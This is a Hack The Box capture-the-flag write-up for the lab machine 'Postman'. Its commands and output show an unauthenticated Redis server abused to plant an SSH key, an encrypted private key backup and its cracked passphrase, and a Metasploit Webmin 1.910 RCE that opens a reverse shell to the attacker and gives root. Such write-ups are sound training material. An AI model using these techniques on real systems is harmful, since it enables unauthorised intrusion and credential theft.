---
layout: post
title:  "Hack The Box - Postman"
date:   2019-12-31 23:59:00 +0800
categories: hackthebox redis ssh webmin linux
---
Despite the name of this box, it was nowhere related to [Postman](https://www.getpostman.com/)! This box was quite weird as I actually jumped straight to root instead of going to user first.

![](/assets/images/postman.png){:height="414px" width="615px"}

# Configuration

The operating systems that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.160 postman.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC postman.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-09 01:39 EST
Nmap scan report for postman.htb (10.10.10.160)
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http?
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 269.64 seconds

{% endhighlight %}

# Enumeration

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, maybe we can find some information on it ?

![](/assets/images/postman1.png)

Seems like an online portfolio or blog. There isn't much to look at though so lets brute force the directories.

{% highlight bash %}
$ gobuster dir -u http://postman.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -q
/images (Status: 301)
/upload (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
{% endhighlight %}

`/upload` seemed interesting but it was just a bunch of images.

![](/assets/images/postman2.png)

Seems like a dead end. Lets try expanding our range of ports to scan.

{% highlight bash %}
$ nmap -sS -p 1-65535 postman.htb
Nmap scan report for postman.htb (10.10.10.160)
Host is up (0.26s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 4548.36 seconds

{% endhighlight %}

Ooo 2 more ports appeared! Lets check out the `redis` service on port `6379`. I came across this article on how to get myself a remote shell to the box.

The first step was to check if authentication is required. Using `nc`, I attempted to send a `echo` command and it was executed successfully.

{% highlight bash %}
nc -v postman.htb 6379
postman.htb [10.10.10.160] 6379 (?) open
echo "Authentication required?"
$24
Authentication required?
quit
+OK
{% endhighlight %}

As you can see, the `redis` service echoed back our text. Remember that there was a `ssh` service running on the box? Lets generate a new `ssh` key and attempt to write it onto the machine.

{% highlight bash %}
ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:TEPWxxvFEd9AoEM+xQGEYHHyVHuUeSugqKuFihcLCf4 root@kali
The key's randomart image is:
+---[RSA 3072]----+
|      =o===+=O*o |
|     . B.oo=B oo.|
|       .+.*o.+ .o|
|.     .o.. +o .  |
|o.   .  S    .   |
|o....            |
| .oo..           |
|..oE.            |
|o...             |
+----[SHA256]-----+
{% endhighlight %}

We then have to prepare the public key to be sent to the `redis` server.
{% highlight bash %}
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
{% endhighlight %}

Using `redis-cli`, we connect to the `redis` server and print the current working directory as well as the location of where the database will be saved to.

{% highlight bash %}
redis-cli -h postman.htb
postman.htb:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
postman.htb:6379> config get dbfilename
1) "dbfilename"
2) "authorized_keys"
{% endhighlight %}

Alright, we are in the correct directory already and the the database will be written to `authorized_keys` when we save. Next we need to clear the database, write our key into it and then save it.

{% highlight bash %}
$ redis-cli -h postman.htb flushall
OK
$ cat foo.txt | redis-cli -h postman.htb -x set crackit
OK
$ redis-cli -h postman.htb save
OK
{% endhighlight %}

Now if try to `ssh` as the `redis` user using the `ssh` key we made,

{% highlight bash %}
ssh -i ~/.ssh/id_rsa redis@postman.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 31 09:16:39 2019 from 10.10.XX.XX
redis@Postman:~$
{% endhighlight %}

Success! Too bad `redis` wasn't the user that has the flag :P If we list `/home`, we see another user called `Matt`.

{% highlight bash %}
redis@Postman:~$ ls /home
Matt
{% endhighlight %}

Lets see if running ['LinEnum'](https://github.com/rebootuser/LinEnum) will give us any insights on how to get access to `Matt`. I will be starting a web server on my machine using the builtin `SimpleHTTPServer` module in `python` and use `wget` to retrieve it.

{% highlight bash %}
$ mkdir httpserver
$ cd httpserver
$ cp ~/LinEnum.sh .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
{% endhighlight %}

{% highlight bash %}
redis@Postman:~$ wget http://10.10.XX.XX/LinEnum.sh
--2019-12-31 10:18:04--  http://10.10.XX.XX/LinEnum.sh
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46476 (45K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                   100%[=============================================>]  45.39K  59.1KB/s    in 0.8s    

2019-12-31 10:18:05 (59.1 KB/s) - ‘LinEnum.sh’ saved [46476/46476]

{% endhighlight %}

Running `LinEnum.sh` shows that there is a `ssh` private key backup in `/opt` named `id_rsa.bak` owned by user `Matt`. Interesting...

{% highlight bash %}
redis@Postman:~$ ./LinEnum.sh
...
[-] Location and Permissions (if accessible) of .bak file(s):
-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 /opt/id_rsa.bak
-rw------- 1 root root 695 Aug 25 21:24 /var/backups/group.bak
-rw------- 1 root shadow 577 Aug 25 21:24 /var/backups/gshadow.bak
-rw------- 1 root shadow 935 Aug 26 03:50 /var/backups/shadow.bak
-rw------- 1 root root 1382 Aug 25 23:48 /var/backups/passwd.bak
...

redis@Postman:~$ cat /opt/id_rsa.bak
redis@Postman:~$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
{% endhighlight %}

With this private `ssh` key, we could try to `ssh` as `Matt`.
{% highlight bash %}
$ ssh -i id_rsa.bak Matt@postman.htb
Enter passphrase for key 'id_rsa.bak':
{% endhighlight %}

Seems like we need a passphrase. Lets see if we can crack it with `john`. 

{% highlight bash %}
$ python ssh2john.py id_rsa.bak > matt.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:04 DONE (2019-12-31 05:57) 0.2083g/s 2987Kp/s 2987Kc/s 2987KC/sa6_123..*7¡Vamos!
Session completed

{% endhighlight %}

With the passphrase, lets try to `ssh` as `Matt` again.

{% highlight bash %}
$ ssh -i id_rsa.bak Matt@postman.htb
Enter passphrase for key 'id_rsa.bak': 
Connection closed by 10.10.10.160 port 22
{% endhighlight %}

What is going on? We are immediately getting disconnected. After some trials, I kind of gave up and decided to move on to the next service at port `10000`.

![](/assets/images/postman3.png)

Hmm lets shift to `HTTPS`. We are immediately greeted with a login page. 

![](/assets/images/postman4.png)

Lets try to login using `Matt:computer2008` as our credentials.

![](/assets/images/postman5.png)

Ooo it seems like a dashboard that monitors the `Webmin` service. After looking around, there doesn't seem to be any place where we attack from. Lets see if we can find any exploits using `searchsploit`.

{% highlight bash %}
$ searchsploit webmin
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
...
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)    | exploits/linux/remote/46984.rb
...
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

# Exploitation

Hmm from the `nmap` results and the dashboard, we can tell that the version of `Webmin` is `1.910`, hence we will use the exploit whose target version is nearest to it.

{% highlight bash %}
$ msfconsole
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.XX.XX
LHOST => 10.10.XX.XX
msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS postman.htb
RHOSTS => postman.htb
msf5 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
PASSWORD => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > run

*] Started reverse TCP handler on 10.10.XX.XX:1337 
[+] Session cookie: 169f13b0b46f82aeea5f5ea57524526f
[*] Attempting to execute the payload...
[*] Command shell session 2 opened (10.10.XX.XX:4444 -> 10.10.10.160:55156) at 2019-12-31 07:50:17 -0500


{% endhighlight %}

There's no prompt but lets try to upgrade to a `tty` shell.

{% highlight bash %}
python -c 'import pty; pty.spawn("/bin/bash")'
root@Postman:/usr/share/webmin/package-updates/# id
id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

Oh damn! We are already root! Getting both the user and root flags should be no problem now.

# user.txt(1)

{% highlight bash %}
root@Postman:/usr/share/webmin/package-updates/# cat /home/Matt/user.txt
cat /home/Matt/user.txt
517aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# root.txt

{% highlight bash %}
root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
cat /root/root.txt
a257XXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# user.txt(2)

Turns out `ssh`ing as the user isn't the only way to remotely access it. Running `su` allowed us login at `Matt`.

{% highlight bash %}
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ cat ~/user.txt
517aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

Rooted ! Thank you for reading and look forward for more writeups and articles !